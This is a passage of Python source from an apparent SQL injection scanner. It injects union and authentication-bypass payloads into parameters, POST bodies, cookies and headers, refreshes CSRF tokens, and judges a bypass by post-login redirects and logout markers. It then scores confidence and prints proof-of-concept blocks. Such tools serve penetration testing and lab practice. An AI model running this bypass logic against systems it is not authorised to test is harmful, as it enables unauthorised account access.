                    payload_type=f"SQLi-Union-POST-{point['name']}-{payload_name}"
                )

            elif point["type"] == "Cookie":
                test_headers = self._build_cookie_headers(
                    headers, cookies,
                    target_name=point["name"],
                    new_value=point["original_value"] + payload
                )
                return self.send_request_with_traffic(
                    full_url,
                    test_headers,
                    method=method,
                    payload=payload,
                    payload_type=f"SQLi-Union-Cookie-{point['name']}-{payload_name}"
                )

            else:  # HTTP Header
                test_headers = {k: v for k, v in headers.items() if k.lower() != 'host'}
                test_headers[point["name"]] = point["original_value"] + payload
                return self.send_request_with_traffic(
                    full_url,
                    test_headers,
                    method=method,
                    payload=payload,
                    payload_type=f"SQLi-Union-Header-{point['name']}-{payload_name}"
                )

        except Exception as e:
            logger.warning(f"Union payload failed: {e}")
            return None
    
    def _test_auth_bypass(self, point, full_url, parsed, params, headers, cookies, body_params,
                        method, baseline_status, baseline_length, payloads):
        """Test for authentication bypass vulnerabilities.
        Only called for login endpoints — the caller guarantees this.
        _send_auth_payload uses allow_redirects=False so we see the raw 302."""

        results = {
            "vulnerable": False,
            "details": [],
            "indicators": []
        }

        # ── Username-field heuristic ──────────────────────────────────────────
        # Payloads like "admin'--" and "administrator'--" only make sense in the
        # username field — they replace the whole value with a known username and
        # comment out the rest of the query.  Testing them in a password field
        # just submits a weird password and the login may still succeed because
        # the username (e.g. "wiener") is valid.  Skip these payloads for fields
        # that don't look like a username field.
        USERNAME_PAYLOAD_KEYS = {
            'auth_admin', 'auth_admin_hash',
            'auth_administrator', 'auth_administrator_hash',
            'admin_comment', 'admin_hash', 'admin_or',
            'administrator_comment', 'administrator_hash',
        }
        USERNAME_FIELD_NAMES = {
            'username', 'user', 'login', 'email', 'uname',
            'user_name', 'user_login', 'userid', 'account',
        }
        field_is_username = point["name"].lower() in USERNAME_FIELD_NAMES

        # ── Post-login redirect paths ─────────────────────────────────────────
        # What does a successful login redirect to?
        POST_LOGIN_PATHS = [
            '/my-account', '/account', '/dashboard', '/home', '/admin',
            '/profile', '/panel', '/portal', '/welcome', '/main', '/app',
        ]
        BACK_TO_LOGIN = ['/login', '/signin', 'error=', 'failed=', 'invalid=']

        def _is_auth_success(response) -> tuple:
            """Return (is_success: bool, evidence: str)"""
            if not response:
                return False, ""

            sc   = getattr(response, 'status_code', 0)
            loc  = response.headers.get('Location', '') if hasattr(response, 'headers') else ''
            loc_lower = loc.lower()
            body = response.text.lower() if hasattr(response, 'text') else ''

            # Primary: raw 302 → post-login page
            if sc in (301, 302, 303, 307, 308):
                if any(p in loc_lower for p in POST_LOGIN_PATHS):
                    if not any(b in loc_lower for b in BACK_TO_LOGIN):
                        return True, f"302 → {loc}"

            # Secondary: 200 but body contains logged-in markers
            if sc == 200:
                for marker in ('log out', 'logout', 'sign out', 'signout',
                               'my account', 'dashboard', 'welcome back'):
                    if marker in body:
                        return True, f"200 + '{marker}' in body"

            return False, ""

        success_count = 0

        if self.boost_mode:
            with concurrent.futures.ThreadPoolExecutor(max_workers=getattr(self, "scan_max_workers", 8)) as executor:
                futures = {}
                for payload_name, payload in payloads.items():
                    if not self.running:
                        break
                    # Skip username-style payloads on non-username fields
                    if payload_name in USERNAME_PAYLOAD_KEYS and not field_is_username:
                        continue
                    future = executor.submit(
                        self._send_auth_payload,
                        point, full_url, parsed, params, headers, cookies, body_params,
                        method, payload_name, payload
                    )
                    futures[future] = (payload_name, payload)

                for future in concurrent.futures.as_completed(futures):
                    payload_name, payload = futures[future]
                    try:
                        response = future.result(timeout=15)
                        is_success, evidence = _is_auth_success(response)
                        if is_success:
                            success_count += 1
                            results["vulnerable"] = True
                            results["details"].append({
                                "payload_name":       payload_name,
                                "payload":            payload,
                                "status_code":        getattr(response, 'status_code', 0),
                                "redirect_destination": response.headers.get('Location', '(none)'),
                                "evidence":           evidence,
                                "has_new_session_cookie": False,
                            })
                            results["indicators"].append(f"Auth bypass ({payload_name}): {evidence}")
                            self.scan_progress.emit(
                                f"  ✅ Auth bypass confirmed: {payload_name} — {evidence}"
                            )
                    except Exception:
                        continue
        else:
            for payload_name, payload in payloads.items():
                if not self.running:
                    break

                # Skip username-style payloads on non-username fields
                if payload_name in USERNAME_PAYLOAD_KEYS and not field_is_username:
                    self.scan_progress.emit(
                        f"  ⏭️  Skipping '{payload_name}' on '{point['name']}' "
                        f"(username-specific payload, not a username field)"
                    )
                    continue

                response = self._send_auth_payload(
                    point, full_url, parsed, params, headers, cookies, body_params,
                    method, payload_name, payload
                )

                is_success, evidence = _is_auth_success(response)
                if is_success:
                    success_count += 1
                    results["vulnerable"] = True
                    results["details"].append({
                        "payload_name":       payload_name,
                        "payload":            payload,
                        "status_code":        getattr(response, 'status_code', 0),
                        "redirect_destination": response.headers.get('Location', '(none)') if hasattr(response, 'headers') else '(none)',
                        "evidence":           evidence,
                        "has_new_session_cookie": False,
                    })
                    results["indicators"].append(f"Auth bypass ({payload_name}): {evidence}")
                    self.scan_progress.emit(
                        f"  ✅ Auth bypass confirmed: {payload_name} — {evidence}"
                    )

        return results
    
    def _send_auth_payload(self, point, full_url, parsed, params, headers, cookies, body_params,
                           method, payload_name, payload):
        """Send a single auth bypass payload — does NOT follow redirects so we
        can inspect the raw 302 Location header ourselves.
        Handles all injection point types."""
        try:
            if point["type"] == "URL Parameter":
                test_params = params.copy()
                test_params[point["name"]] = [payload]
                query_string = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

                return self.send_request_with_traffic(
                    test_url,
                    {k: v for k, v in headers.items() if k.lower() != 'host'},
                    method="GET",
                    payload=payload,
                    payload_type=f"SQLi-Auth-{point['name']}-{payload_name}",
                    allow_redirects=False,
                )

            elif point["type"] == "POST Body":
                fresh_body_params, fresh_headers = self._with_fresh_csrf(
                    body_params, full_url, headers
                )
                test_body_params = fresh_body_params.copy()
                test_body_params[point["name"]] = [payload]

                content_type = headers.get("Content-Type", "").lower()
                if "application/json" in content_type:
                    test_body = json.dumps({k: v[0] for k, v in test_body_params.items()})
                else:
                    test_body = urllib.parse.urlencode(test_body_params, doseq=True)

                return self.send_request_with_traffic(
                    full_url,
                    {k: v for k, v in fresh_headers.items() if k.lower() != 'host'},
                    method="POST",
                    body=test_body,
                    payload=payload,
                    payload_type=f"SQLi-Auth-POST-{point['name']}-{payload_name}",
                    allow_redirects=False,
                )

            elif point["type"] == "Cookie":
                test_headers = self._build_cookie_headers(
                    headers, cookies,
                    target_name=point["name"],
                    new_value=payload
                )
                return self.send_request_with_traffic(
                    full_url,
                    test_headers,
                    method=method,
                    payload=payload,
                    payload_type=f"SQLi-Auth-Cookie-{point['name']}-{payload_name}",
                    allow_redirects=False,
                )

            else:  # HTTP Header
                test_headers = {k: v for k, v in headers.items() if k.lower() != 'host'}
                test_headers[point["name"]] = payload
                return self.send_request_with_traffic(
                    full_url,
                    test_headers,
                    method=method,
                    payload=payload,
                    payload_type=f"SQLi-Auth-Header-{point['name']}-{payload_name}",
                    allow_redirects=False,
                )

        except Exception as e:
            logger.warning(f"Auth payload failed: {e}")
            return None
    
    def _calculate_confidence(self, detection_indicators):
        """Calculate confidence score based on detection methods"""
        score = 0
        
        # Weighted scoring
        weights = {
            "error_based": 30,
            "time_based": 30,
            "boolean_based": 25,
            "union_based": 25,
            "auth_bypass": 20
        }
        
        for method, indicators in detection_indicators.items():
            if indicators:
                score += weights.get(method, 10) * min(len(indicators), 3)
        
        # Cap at 100
        score = min(score, 100)
        
        # Confidence level
        if score >= 80:
            return "HIGH"
        elif score >= 50:
            return "MEDIUM"
        elif score >= 25:
            return "LOW"
        else:
            return "INFO"
    
    def _build_vulnerability_chain(self, detection_indicators):
        """Build a chain of evidence showing how vulnerability was detected"""
        chain = []
        
        if detection_indicators.get("error_based"):
            chain.append("❌ Error-based: SQL syntax broken, database error revealed")
        
        if detection_indicators.get("boolean_based"):
            chain.append("🔍 Boolean-based: TRUE/FALSE conditions produce different responses")
        
        if detection_indicators.get("time_based"):
            chain.append("⏱️ Time-based: Deliberate delays observed in response time")
        
        if detection_indicators.get("union_based"):
            chain.append("🔄 Union-based: Extra data appended to query results")
        
        if detection_indicators.get("auth_bypass"):
            chain.append("🔓 Auth bypass: Authentication logic can be subverted")
        
        return chain
    
    def _generate_detailed_summary(self, results):
        """Generate a detailed summary of SQLi findings, with full POC blocks at the end."""
        lines = []
        lines.append("✅ SQL INJECTION VULNERABILITIES DETECTED!")
        lines.append("=" * 60)

        vuln_count = len(results["details"])
        lines.append(f"Found {vuln_count} vulnerable injection point(s)")
        lines.append(f"Overall Confidence: {results['confidence_score']}")

        if results.get("database_fingerprint"):
            lines.append(f"Database Fingerprint: {results['database_fingerprint']}")

        lines.append("")
        lines.append("DETECTION METHODS USED:")
        if results["detection_summary"]["error_based"]:
            lines.append("  • Error-based SQL injection")
        if results["detection_summary"]["boolean_based"]:
            lines.append("  • Boolean-based blind SQL injection")
        if results["detection_summary"]["time_based"]:
            lines.append("  • Time-based blind SQL injection")
        if results["detection_summary"]["union_based"]:
            lines.append("  • Union-based SQL injection")
        if results["detection_summary"].get("conditional_error"):
            lines.append("  • Conditional error-based blind SQL injection")
        if results["detection_summary"].get("verbose_error"):
            lines.append("  • Verbose error data extraction (CAST/CONVERT)")
        if results["detection_summary"]["auth_bypass"]:
            lines.append("  • Authentication bypass / Logic flaw")

        lines.append("")
        lines.append("VULNERABLE POINTS:")
        for i, point in enumerate(results["vulnerable_points"], 1):
            lines.append(f"  [{i}] {point}")

        lines.append("")
        lines.append("=" * 60)

        # Emit plain summary to the log first
        summary_text = "\n".join(lines)

        # ── Collect all POC dicts from evidence across every vulnerable point ──
        all_pocs = []
        for detail in results.get("details", []):
            poc_found = None
            # Check direct poc key on time-based details
            if isinstance(detail, dict) and detail.get("poc"):
                poc_found = detail["poc"]
            # Check evidence list (error/union/boolean based)
            if not poc_found:
                for ev in detail.get("evidence", []):
                    if isinstance(ev, dict) and ev.get("poc"):
                        poc_found = ev["poc"]
                        break
            if poc_found:
                all_pocs.append(poc_found)

        # ── Emit the consolidated POC block section ───────────────────────────
        if all_pocs:
            self.scan_progress.emit(f"\n{'═' * 72}")
            self.scan_progress.emit(f"{'💀  PROOF OF CONCEPT SUMMARY  💀':^72}")
            self.scan_progress.emit(f"{'═' * 72}")
            for poc in all_pocs:
                self._emit_poc_block(poc)

        return summary_text